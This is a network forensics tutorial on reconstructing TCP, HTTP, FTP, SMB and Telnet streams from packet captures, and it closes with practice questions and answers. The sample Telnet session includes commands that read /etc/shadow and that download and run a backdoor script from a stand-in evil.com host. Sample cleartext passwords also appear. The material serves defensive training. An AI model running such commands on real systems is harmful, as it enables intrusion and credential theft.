TCP Handshake Review

Every TCP connection begins with a three-way handshake. In forensic analysis, the handshake timestamps establish when a connection was initiated and by whom.

Three-Way Handshake in a PCAP
# Packet 1: Client initiates connection
10:14:32.001  10.0.0.50:49301 -> 185.234.52.18:443  [SYN]      Seq=0

# Packet 2: Server acknowledges and responds
10:14:32.045  185.234.52.18:443 -> 10.0.0.50:49301  [SYN,ACK]  Seq=0 Ack=1

# Packet 3: Client completes handshake
10:14:32.046  10.0.0.50:49301 -> 185.234.52.18:443  [ACK]      Seq=1 Ack=1

# Connection ESTABLISHED -- data transfer begins
# The 44ms round-trip time (RTT) indicates the server is geographically distant

Forensic Value of the Handshake

  • The SYN packet identifies the initiator (client) -- who started the connection
  • RTT calculation reveals geographic distance to the server
  • SYN without SYN-ACK = connection refused or filtered (port scan evidence)
  • Multiple SYN retransmissions = server is unreachable or blocking

HTTP Object Extraction

Wireshark can automatically extract files transferred over HTTP. This is the fastest way to recover downloaded malware, exfiltrated documents, or web shell uploads.

Wireshark HTTP Object Export
# GUI: File > Export Objects > HTTP
# Lists all HTTP-transferred files with:
#   - Hostname, Content Type, Size, Filename

# tshark equivalent:
$ tshark -r suspect.pcap --export-objects http,./extracted/

# Example extracted files:
./extracted/invoice.pdf          (42 KB)   -- from mail-cdn.evil.com
./extracted/update.dll           (186 KB)  -- from cdn-static.evil.com
./extracted/logo.png             (8 KB)    -- from company.com
./extracted/data.php             (2.1 MB)  -- POST to exfil.evil.com

# Hash the suspicious files immediately
$ sha256sum ./extracted/update.dll
e3b0c44298fc1c149afbf4c8996fb924...  update.dll
# Check hash against VirusTotal, MalwareBazaar

FTP Data Channel Reconstruction

FTP uses two channels: the control channel (port 21) for commands and a separate data channel for file transfers. The control channel shows what files were accessed; the data channel contains the actual file content.

FTP Session Reconstruction
# FTP Control Channel (port 21) -- Follow TCP Stream
220 ProFTPD Server ready.
USER admin
331 Password required for admin
PASS Summer2024!
230 User admin logged in
CWD /home/admin/finance
250 CWD command successful
RETR employee_salaries_2024.xlsx
150 Opening BINARY mode data connection
226 Transfer complete
RETR customer_database.csv
150 Opening BINARY mode data connection
226 Transfer complete
QUIT
221 Goodbye.

# The actual file data is on the DATA channel (port 20 or passive port)
# Filter: ftp-data to find the data transfer packets
# Follow that TCP stream and save as raw to recover the file

FTP Security Issues

FTP transmits everything in cleartext, including credentials. In this example, the password "Summer2024!" is fully visible. Additionally, the attacker downloaded salary data and a customer database -- this is data exfiltration evidence. Always check FTP streams for credential exposure and unauthorized file access.

SMB File Transfer Extraction

SMB (Server Message Block) is the protocol used for Windows file sharing. In forensic analysis, SMB traffic reveals lateral movement, credential use, and file access on network shares.

SMB Analysis in Wireshark
# Display filter for SMB file operations
smb2.cmd == 5    # Create/Open file requests
smb2.cmd == 8    # Read requests
smb2.cmd == 9    # Write requests

# Example SMB2 Create Request (opening a file):
SMB2 Create Request  File: \finance\Q4_report.docx
  Requested Access: READ_DATA, EXECUTE
  Share: \\FILESERVER\shared$

# Export SMB objects: File > Export Objects > SMB/SMB2
# Wireshark reassembles the file from read responses

# Key fields to examine:
smb2.acct    -- Account used for authentication
smb2.domain  -- Domain of the authenticating user
smb2.tree    -- Share path accessed
smb2.filename -- File being accessed

Telnet and SSH Session Analysis

Interactive sessions like Telnet show every keystroke in cleartext. SSH sessions are encrypted but the connection metadata is still visible.

Telnet Session Reconstruction
# Follow TCP Stream on port 23 reveals full session:
login: root
Password: toor123
Last login: Tue Mar 19 14:22:33 from 10.0.0.50
root@webserver:~# cat /etc/shadow
root:$6$salt$hash...:19435:0:99999:7:::
www-data:*:19200:0:99999:7:::
root@webserver:~# wget http://evil.com/backdoor.sh -O /tmp/bd.sh
root@webserver:~# chmod +x /tmp/bd.sh && /tmp/bd.sh

# This telnet session shows:
# 1. Root credential exposure (toor123)
# 2. Shadow file exfiltration (credential theft)
# 3. Backdoor download and execution

Encrypted vs Unencrypted Streams

  • Telnet (port 23): fully cleartext -- every command and response is visible
  • SSH (port 22): encrypted after key exchange -- only connection metadata visible
  • HTTP (port 80): cleartext request/response including headers and body
  • HTTPS (port 443): encrypted after TLS handshake -- need keys for decryption
  • FTP (port 21): cleartext commands and credentials; data channel also cleartext
  • FTPS/SFTP: encrypted -- limited to metadata analysis

Practice: Stream Analysis Scenarios

For each scenario, identify what evidence you would extract and how:

  1. You see HTTP traffic to a known malware distribution site. The response contains a Content-Type of application/octet-stream. How do you extract the downloaded file?
  2. An FTP session on the capture shows a user logging in and downloading three files from a finance share. What evidence do you document?
  3. You observe SMB2 traffic from a compromised workstation to four different internal servers on port 445. What does this pattern indicate?
  4. A TCP stream on port 4444 shows the text "meterpreter >" followed by commands. What tool is the attacker using?

Answers:

1. File > Export Objects > HTTP, save the file, hash it, submit to VirusTotal. Also record the source URL and timestamp.

2. Document: cleartext username/password, files downloaded (names, sizes, timestamps), source IP, and the FTP server accessed. The credentials are now compromised.

3. Lateral movement. The compromised workstation is accessing file shares or attempting authentication against multiple internal servers. Check for PsExec, WMI, or service creation in the SMB traffic.

4. Metasploit Meterpreter shell. The "meterpreter >" prompt is the Meterpreter command interface. Document all commands executed and their output.

Key Takeaways

  • TCP handshake timestamps establish connection initiation and can reveal geographic distance via RTT
  • Wireshark's Export Objects feature extracts files from HTTP, SMB, and other protocols automatically
  • FTP control channels expose credentials and file access in cleartext
  • SMB traffic reveals lateral movement, file access, and authentication activity
  • Telnet sessions are fully reconstructable -- every keystroke is visible
  • Always hash extracted files and check against threat intelligence databases
